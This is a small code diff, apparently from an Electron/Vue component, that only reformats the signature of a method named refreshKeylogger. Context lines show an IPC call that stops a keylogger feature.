@@ -119,7 +119,7 @@ export default {
       })
       ipcRenderer.send('requestKeylogger', 'stop')
     },
-    refreshKeylogger(){
+    refreshKeylogger () {
       this.updateKeylogger()
     }
   },
